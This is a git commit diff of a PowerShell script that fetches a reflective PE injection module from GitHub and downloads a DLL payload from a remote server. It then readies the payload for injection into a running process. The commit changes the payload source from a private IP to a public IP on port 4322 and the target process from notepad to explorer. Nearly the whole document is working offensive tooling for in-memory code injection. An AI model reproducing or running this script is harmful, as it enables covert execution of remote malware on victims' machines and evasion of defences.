35501a47633c5afc1518d1c73da551945a7b5673
lyethar <107083757+lyethar@users.noreply.github.com>
2023-04-18 12:15:47 -0400

    Update initiate-Reflect-DLL.ps1

--- initiate-Reflect-DLL.ps1
+++ initiate-Reflect-DLL.ps1
@@ -1,6 +1,6 @@
 (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/lyethar/Reflective-PE-Injection/main/Invoke-PEInjection.ps1', 'C:\Windows\Tasks\Invoke-ReflectivePEInjection.ps1')
-$bytes = (New-Object System.Net.WebClient).DownloadData('http://10.0.0.209/payload.dll')
-$procName = "notepad"
+$bytes = (New-Object System.Net.WebClient).DownloadData('http://20.84.114.52:4322/HTTP_1234_x64.dll')
+$procName = "explorer"
 $localByName = Get-Process -Name $procName
 $procid = $localByName[0].Id
 Import-Module 'C:\Windows\Tasks\Invoke-ReflectivePEInjection.ps1'
